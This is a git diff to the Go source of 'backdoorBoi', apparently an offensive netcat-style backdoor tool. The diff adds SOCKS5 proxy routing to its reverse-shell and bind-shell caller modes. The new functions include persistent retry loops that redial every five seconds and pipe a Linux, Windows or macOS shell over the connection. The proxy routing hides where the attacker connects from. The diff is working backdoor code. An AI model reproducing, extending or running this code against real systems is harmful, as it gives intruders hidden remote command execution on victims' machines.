@@ -15,6 +15,7 @@ import (
 
 	"github.com/BuildAndDestroy/backdoorBoi/pkg/encryption"
 	"github.com/BuildAndDestroy/backdoorBoi/pkg/environment"
+	"github.com/BuildAndDestroy/backdoorBoi/pkg/proxies"
 )
 
 type NetcatInput struct {
@@ -32,8 +33,8 @@ func (nni *NetcatInput) SetNetcatInput(fs *flag.FlagSet) {
 	fs.StringVar(&nni.HostAddress, "address", "127.0.0.1", "Set host address, default is 127.0.0.1")
 	fs.IntVar(&nni.Port, "port", 8080, "Provide a port to bind to on this host")
 	fs.BoolVar(&nni.Bind, "bind", false, "Set Flag for Bind shell. Note: do not use with --reverse")
-	fs.BoolVar(&nni.Reverse, "reverse", false, "Set Flag for a Reverse Shell. Note: do not use with --bind")
 	fs.BoolVar(&nni.Caller, "caller", false, "Call to a bind shell.")
+	fs.BoolVar(&nni.Reverse, "reverse", false, "Set Flag for a Reverse Shell. Note: do not use with --bind")
 	fs.BoolVar(&nni.Listener, "listen", false, "Create a Listener for rev shells.")
 	fs.BoolVar(&nni.Tls, "tls", false, "Use encryption for Netcat connection. RECOMMENDED")
 	fs.StringVar(&nni.Proxy, "proxy", "", "Use a SOCKS5 proxy between us and target, example 127.0.0.1:9050")
@@ -46,41 +47,47 @@ func NetcatArgLogic(nni *NetcatInput) {
 		callAddress = fmt.Sprintf("%s:%d", nni.HostAddress, nni.Port)
 	)
 	NetcatArgumentExceptions(nni)
+	//
 	if nni.Bind && !nni.Tls {
 		BindLogic(bindAddress, osRuntime)
 	}
 	if nni.Bind && nni.Tls {
-		tlsConfig := SetupTLSServer()
+		tlsConfig := encryption.SetupTLSServer()
 		TlsBindLogicServer(tlsConfig, bindAddress, osRuntime)
 	}
 	if nni.Reverse && nni.Tls && nni.Proxy != "" {
-		// dialer := proxies.DialThroughSOCKS5(nni.Proxy)
-		tlsConfig := SetupTLSClient()
-		TlsReverseLogic(tlsConfig, callAddress, osRuntime)
+		tlsConfig := encryption.SetupTLSClient()
+		ProxyTlsReverseLogic(nni.Proxy, callAddress, osRuntime, tlsConfig)
+	}
+	if nni.Reverse && !nni.Tls && nni.Proxy != "" {
+		ProxyReverseLogic(nni.Proxy, callAddress, osRuntime)
 	}
 	if nni.Reverse && !nni.Tls {
 		ReverseLogic(callAddress, osRuntime)
 	}
 	if nni.Reverse && nni.Tls {
-		tlsConfig := SetupTLSClient()
+		tlsConfig := encryption.SetupTLSClient()
 		TlsReverseLogic(tlsConfig, callAddress, osRuntime)
 	}
-	// if nni.Caller && nni.Tls && nni.Proxy != "" {
-	// 	proxies.DialThroughSOCKS5(nni.Proxy)
-	// 	TlsBindLogicClient(callAddress)
-	// }
+	if nni.Caller && nni.Tls && nni.Proxy != "" {
+		tlsConfig := encryption.SetupTLSClient()
+		ProxyTlsBindLogicClient(nni.Proxy, callAddress, tlsConfig)
+	}
+	if nni.Caller && !nni.Tls && nni.Proxy != "" {
+		ProxyCallBindLogic(nni.Proxy, callAddress)
+	}
 	if nni.Caller && !nni.Tls {
 		CallBindLogic(callAddress)
 	}
 	if nni.Caller && nni.Tls {
-		tlsConfig := SetupTLSClient()
+		tlsConfig := encryption.SetupTLSClient()
 		TlsBindLogicClient(tlsConfig, callAddress)
 	}
 	if nni.Listener && !nni.Tls {
 		OpenListener(bindAddress, osRuntime)
 	}
 	if nni.Listener && nni.Tls {
-		tlsConfig := SetupTLSServer()
+		tlsConfig := encryption.SetupTLSServer()
 		TlsOpenListener(tlsConfig, bindAddress, osRuntime)
 	}
 }
@@ -98,7 +105,6 @@ func NetcatArgumentExceptions(nni *NetcatInput) {
 	if nni.Caller && nni.Reverse && nni.Listener {
 		log.Fatalln("Cannot call, reverse, and listen at the same time.")
 	}
-
 	if nni.Bind && nni.Reverse {
 		log.Fatalln("Cannot bind and reverse at the same time.")
 	}
@@ -116,6 +122,31 @@ func NetcatArgumentExceptions(nni *NetcatInput) {
 	}
 	if nni.Reverse && nni.Listener {
 		log.Fatalln("Cannot reverse and listen at the same time.")
+	}
+}
+
+func ProxyReverseLogic(proxyAddress, callAddress, osRuntime string) {
+	var tlsBoolean bool = false
+	var tlsConfig *tls.Config
+	for {
+		dialer, err := proxies.DialThroughSOCKS5(proxyAddress, callAddress, tlsConfig, tlsBoolean)
+		if err != nil {
+			log.Println(err)
+			log.Println("[*] Retrying in 5 seconds")
+			time.Sleep(5 * time.Second)
+			continue
+		}
+		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
+		switch osRuntime {
+		case "linux":
+			RevHandleLinux(dialer)
+		case "windows":
+			RevHandleWindows(dialer)
+		case "darwin":
+			RevHandleDarwin(dialer)
+		default:
+			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+		}
 	}
 }
 
@@ -142,44 +173,31 @@ func ReverseLogic(callAddress string, osRuntime string) {
 	}
 }
 
-func SetupTLSClient() *tls.Config {
-	//Generate client cert and key
-	certPEM, keyPEM, err := encryption.GenerateSelfSignedClientCert()
-	if err != nil {
-		log.Fatalln(err)
+func ProxyTlsReverseLogic(proxyAddress, callAddress, osRuntime string, tlsConfig *tls.Config) {
+	// Parse a SOCKS5 connection with TLS wrapper
+	// Begin the reverse shell
+	var tlsBoolean bool = true
+	for {
+		dialer, err := proxies.DialThroughSOCKS5(proxyAddress, callAddress, tlsConfig, tlsBoolean)
+		if err != nil {
+			// log.Fatalln("[-] Failed to establish TLS connection through SOCKS5: %v", err)
+			log.Println(err)
+			log.Println("[*] Retrying in 5 seconds")
+			time.Sleep(5 * time.Second)
+			continue
+		}
+		log.Printf("[*] Rev shell spawning, connecting to %s", callAddress)
+		switch osRuntime {
+		case "linux":
+			RevHandleLinux(dialer)
+		case "windows":
+			RevHandleWindows(dialer)
+		case "darwin":
+			RevHandleDarwin(dialer)
+		default:
+			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
+		}
 	}
-
-	cert, err := tls.X509KeyPair(certPEM, keyPEM)
-	if err != nil {
-		log.Fatalf("client: loadkeys: %s\n", err)
-	}
-
-	// Configure TLS with client certificate
-	tlsConfig := &tls.Config{
-		Certificates:       []tls.Certificate{cert},
-		InsecureSkipVerify: true,
-	}
-	return tlsConfig
-}
-
-func SetupTLSServer() *tls.Config {
-	//Generate server cert and key
-	certPEM, keyPEM, err := encryption.GenerateSelfSignedServerCert()
-	if err != nil {
-		log.Fatalln(err)
-	}
-	// Load server's certificate and private key
-	// cert, err := tls.LoadX509KeyPair("server.crt", "server.key")
-	cert, err := tls.X509KeyPair(certPEM, keyPEM)
-	if err != nil {
-		log.Fatalf("server: loadkeys: %s", err)
-	}
-
-	// Configure TLS with server certificate
-	tlsConfig := &tls.Config{
-		Certificates: []tls.Certificate{cert},
-	}
-	return tlsConfig
 }
 
 func TlsReverseLogic(tlsConfig *tls.Config, callAddress, osRuntime string) {
@@ -256,6 +274,21 @@ func TlsBindLogicServer(tlsConfig *tls.Config, bindAddress string, osRuntime str
 			log.Fatalf("Unsupported OS, report bug for %s\n", osRuntime)
 		}
 	}
+}
+
+func ProxyTlsBindLogicClient(proxyAddress, callAddress string, tlsConfig *tls.Config) {
+	// Parse a SOCKS5 connection with TLS wrapper
+	// Begin the reverse shell
+	var tlsBoolean bool = true
+	dialer, err := proxies.DialThroughSOCKS5(proxyAddress, callAddress, tlsConfig, tlsBoolean)
+	if err != nil {
+		log.Fatalf("client: dial: %s\n", err)
+	}
+	defer dialer.Close()
+
+	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)
+
+	BindShellCall(dialer)
 }
 
 func TlsBindLogicClient(tlsConfig *tls.Config, callAddress string) {
@@ -335,6 +368,22 @@ func RevHandleDarwin(caller net.Conn) {
 	cmd.Stdout = caller
 	cmd.Stderr = caller
 	cmd.Run()
+}
+
+func ProxyCallBindLogic(proxyAddress, callAddress string) {
+	// Route through a SOCKS5 proxy
+	// Call to a bind shell
+	var tlsBoolean bool = false
+	var tlsConfig *tls.Config
+	dialer, err := proxies.DialThroughSOCKS5(proxyAddress, callAddress, tlsConfig, tlsBoolean)
+	if err != nil {
+		log.Fatalln(err)
+	}
+	defer dialer.Close()
+
+	log.Printf("[*] Bind shell spawning, connecting to %s", callAddress)
+
+	BindShellCall(dialer)
 }
 
 func CallBindLogic(callAddress string) {
